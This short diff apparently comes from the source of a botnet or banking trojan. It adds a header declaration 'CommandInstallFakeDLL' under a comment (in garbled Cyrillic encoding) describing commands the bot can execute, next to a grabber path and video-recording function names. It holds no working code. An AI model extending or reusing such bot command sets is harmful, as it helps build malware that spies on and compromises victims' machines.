@@ -36,6 +36,11 @@ extern CSSTR StrGrabberPath[];
 extern CSSTR StrPrefixFileName[];
 
 
+
+// ѕеречень команд, которые может выполн€ь бот
+extern CSSTR CommandInstallFakeDLL[];
+
+
 // »мена функций библиотеки видеозаписи.
 extern CSSTR VideRecFuncRecordProcess[];
 extern CSSTR VideRecFuncRecordWnd[];
